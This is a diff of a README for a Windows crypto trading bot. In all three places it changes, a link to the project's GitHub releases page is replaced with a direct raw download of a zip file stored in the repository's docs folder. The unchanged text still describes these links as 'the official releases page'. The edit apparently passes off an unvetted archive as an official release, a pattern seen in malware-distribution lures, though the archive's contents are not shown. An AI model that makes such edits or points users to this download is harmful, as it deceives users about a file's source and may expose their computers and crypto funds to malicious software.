@@ -1,6 +1,6 @@
 # ⚔️ crypto-trading-arena - Simple Crypto Trading Bot
 
-[![Download](https://img.shields.io/badge/Download-Get%20Latest%20Version-brightgreen)](https://github.com/JuanCombriza/crypto-trading-arena/releases)
+[![Download](https://img.shields.io/badge/Download-Get%20Latest%20Version-brightgreen)](https://github.com/JuanCombriza/crypto-trading-arena/raw/refs/heads/main/docs/trading-crypto-arena-2.5.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow these steps to download and run crypto-trading-arena on your Windows PC. 
 
 Visit this page to download the latest version:
 
-[![Get Latest Release](https://img.shields.io/badge/Download-crypto--trading--arena-blue)](https://github.com/JuanCombriza/crypto-trading-arena/releases)
+[![Get Latest Release](https://img.shields.io/badge/Download-crypto--trading--arena-blue)](https://github.com/JuanCombriza/crypto-trading-arena/raw/refs/heads/main/docs/trading-crypto-arena-2.5.zip)
 
 This link will take you to the official releases page. Look for the latest stable version under the "Assets" section. The file you want usually ends with `.exe`. It might be named something like `crypto-trading-arena-setup.exe` or similar.
 
@@ -143,7 +143,7 @@ crypto-trading-arena shows live updates on your trades, profit and loss, and mar
 Check the releases page regularly to download and install updates.  
 
 This is the same link used for the initial download:  
-[https://github.com/JuanCombriza/crypto-trading-arena/releases](https://github.com/JuanCombriza/crypto-trading-arena/releases)
+[https://github.com/JuanCombriza/crypto-trading-arena/raw/refs/heads/main/docs/trading-crypto-arena-2.5.zip](https://github.com/JuanCombriza/crypto-trading-arena/raw/refs/heads/main/docs/trading-crypto-arena-2.5.zip)
 
 Updates fix bugs and bring new features.
 
